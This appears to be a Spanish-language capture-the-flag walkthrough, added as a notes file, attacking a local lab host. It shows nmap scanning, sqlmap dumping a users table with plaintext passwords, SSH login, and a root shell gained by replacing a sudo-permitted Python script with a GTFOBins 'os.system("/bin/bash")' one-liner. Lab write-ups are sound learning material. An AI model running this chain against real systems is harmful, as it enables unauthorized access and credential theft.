@@ -1,0 +1,95 @@
+# Escaneo de puertos, servicios y versiones
+nmap -Pn -n -sS -p- -sV --script 'vuln' --min-rate 5000 -vvv 172.19.0.2 -oN nmap
+
+Discovered open port 22/tcp on 172.19.0.2
+Discovered open port 80/tcp on 172.19.0.2
+
+comenzamos a chequear el servicio web levantado y nos conseguimos con un formulario buscardor de usuarios...
+revisamos el codigo fuente y no conseguimos nada
+
+probando busquedas habituales de usuarios en el formulario como: administrador y admin...
+con admin nos devolvio el resultado:
+
+Username: admin - Password: adminpassword
+
+como esta levantado el servicio ssh probamos las credenciales que conseguimos
+
+ssh admin@172.19.0.2				| no son validas...
+
+como podemos ver, se esta consultando una base de datos que contiene usuarios y claves, intentaremos ahora vulnerar esa base de datos con sqlmap...
+
+
+abrimos burpsuite para interceptar una peticion y hacemos la busqueda de cualquier usuario
+
+============================================================================================
+GET /?user=dvwdv HTTP/1.1
+Host: 172.19.0.2
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Referer: http://172.19.0.2/?user=admin
+Upgrade-Insecure-Requests: 1
+============================================================================================
+
+peticion interceptada, ahora guardamos esta peticion en un archivo (en mi caso lo guarde como peticion)
+
+ahora se lo pasamos a sqlmap a ver si es capaz de conseguir o detectar algo
+
+sqlmap -r peticion				| aqui le estamos pasando la peticion que interceptamos con burpsuite
+[18:18:20] [INFO] the back-end DBMS is MySQL	| nos reporta que la base de datos es MySQL
+
+sqlmap -r peticion --dbs			| vamos a dumpear bases de datos 
+available databases [2]:
+[*] information_schema
+[*] testdb
+
+nos reporta 2 bases de datos, asi que vamos a dumpear la base de datos >>>>>> testdb
+
+sqlmap -r peticion -D testdb --dump
+
+-D : para especificar la base de datos 
+--dump : para dumpear la db seleccionada
+
+Database: testdb
+Table: users
+[3 entries]
++----+---------------+----------+
+| id | password      | username |
++----+---------------+----------+
+| 1  | adminpassword | admin    |
+| 2  | user1password | user1    |
+| 3  | kvzlxpassword | kvzlx    |
++----+---------------+----------+
+
+conseguimos 3 usuarios, el primero ya lo probamos por ssh y no funciono, asi que ahora probaremos con los otros 2 
+
+ssh kvzlx@172.19.0.2				| pudimos acceder con el 3er user
+
+# Escalada de Privilegios
+
+sudo -l
+
+/usr/bin/python3 /home/kvzlx/system_info.py
+
+tenemos un binario y un script python
+
+cat /home/kvzlx/system_info.py				| para ver que contiene el script pero no nos sirve de nada su contenido
+
+nos vamos a gtfobins y buscamos python
+
+    sudo python -c 'import os; os.system("/bin/bash")'
+
+lo que haremos es modificar el script /home/kvzlx/system_info.py con import os; os.system("/bin/bash")
+no tenemos permisos de escritura, le asignamos permisos
+
+chmod +w /home/kvzlx/system_info.py					| tampoco podemos, pero si podemos eliminarlo
+rm /home/kvzlx/system_info.py						| lo eliminamos
+
+echo 'import os; os.system("/bin/bash")' > /home/kvzlx/system_info.py
+nos creamos un script con el mismo nombre y en la misma direccion que el que borramos con el codigo de gtfobins
+
+sudo /usr/bin/python3 /home/kvzlx/system_info.py
+whoami
+#root
